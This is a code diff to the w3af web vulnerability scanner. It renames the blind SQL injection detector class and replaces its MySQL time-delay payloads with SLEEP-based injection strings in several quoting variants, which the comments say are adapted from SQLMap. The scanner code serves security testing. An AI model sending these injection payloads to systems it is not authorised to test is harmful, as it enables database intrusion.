@@ -27,7 +27,7 @@ from w3af.core.controllers.delay_detection.exact_delay_controller import ExactDe
 from w3af.core.controllers.delay_detection.exact_delay import ExactDelay
 
 
-class blind_sqli_time_delay(object):
+class BlindSQLTimeDelay(object):
     """
     This class tests for blind SQL injection bugs using time delays, the logic
     is here and not as an audit plugin because this logic is also used in
@@ -90,28 +90,44 @@ class blind_sqli_time_delay(object):
 
         # MySQL 5
         #
-        # Thank you guys for adding sleep(seconds) !
+        # Note: These payloads are better than "1 or SLEEP(%s)" since they
+        #       do not call SLEEP for each row in the table
         #
-        res.append(ExactDelay("1 or SLEEP(%s)"))
-        res.append(ExactDelay("1' or SLEEP(%s) and '1'='1"))
-        res.append(ExactDelay('1" or SLEEP(%s) and "1"="1'))
+        # Payloads are heavily based on the ones from SQLMap which can be found
+        # at xml/payloads/05_time_blind.xml
+        #
+        res.append(ExactDelay("1 AND (SELECT * FROM (SELECT(SLEEP(%s)))foo)"))
+        res.append(ExactDelay("1 OR (SELECT * FROM (SELECT(SLEEP(%s)))foo)"))
+
+        # Single and double quote string concat
+        res.append(ExactDelay("'+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+'"))
+        res.append(ExactDelay('"+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+"'))
+
+        # These are required, they don't cover the same case than the previous
+        # ones (string concat).
+        res.append(ExactDelay("' AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND '1'='1"))
+        res.append(ExactDelay('" AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND "1"="1'))
+        res.append(ExactDelay("' OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR '1'='2"))
+        res.append(ExactDelay('" OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR "1"="2'))
 
         # MySQL 4
         #
-        # MySQL 4 doesn't have a sleep function, so I have to use BENCHMARK(1000000000,MD5(1))
-        # but the benchmarking will delay the response a different amount of time in each computer
-        # which sucks because I use the time delay to check!
+        # MySQL 4 doesn't have a sleep function, so I have to use
+        # BENCHMARK(1000000000,MD5(1)) but the benchmarking will delay the
+        # response a different amount of time in each computer which sucks
+        # because I use the time delay to check!
         #
         # In my test environment 3500000 delays 10 seconds
-        # This is why I selected 2500000 which is guaranteed to (at least) delay 8
-        # seconds; and I only check the delay like this:
-        #                 response.get_wait_time() > (original_wait_time + self._wait_time-2):
+        # This is why I selected 2500000 which is guaranteed to (at least) delay
+        # 8 seconds; and I only check the delay like this:
         #
-        # With a small wait time of 5 seconds, this should work without problems...
-        # and without hitting the ExtendedUrllib timeout !
+        #    response.get_wait_time() > (original_wait_time + self._wait_time-2)
         #
-        #    TODO: Need to implement variable_delay.py (modification of ExactDelay)
-        #          and use the following there:
+        # With a small wait time of 5 seconds, this should work without
+        # problems... and without hitting the ExtendedUrllib timeout !
+        #
+        # TODO: Need to implement variable_delay.py (modification of ExactDelay)
+        #       and use the following there:
         #
         #res.append( delay("1 or BENCHMARK(2500000,MD5(1))") )
         #res.append( delay("1' or BENCHMARK(2500000,MD5(1)) or '1'='1") )
@@ -124,5 +140,6 @@ class blind_sqli_time_delay(object):
 
         # TODO: Add Oracle support
         # TODO: Add XXXXX support
+        # TODO: https://github.com/andresriancho/w3af/issues/12385
 
         return res
